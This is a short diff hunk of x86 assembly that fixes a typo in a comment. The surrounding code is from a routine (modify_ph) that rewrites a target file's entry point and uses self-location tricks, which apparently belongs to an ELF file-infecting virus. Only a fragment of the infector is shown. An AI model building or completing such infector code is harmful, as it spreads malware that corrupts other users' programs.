@@ -178,7 +178,7 @@ modify_ph:
 	mov ecx, ebp
 	sub ecx,20 ; ecx holds the ptr to the previous entry point
 	write dword [ebp-8],ecx,4 ; change previous entry point in the file
-	close dword [ebp-8] ;closing the fileS
+	close dword [ebp-8] ;closing the file
 	call get_my_loc
 	add dword [ebp-4],(PreviousEntryPoint-anchor)
 	mov eax, dword [ebp-4]
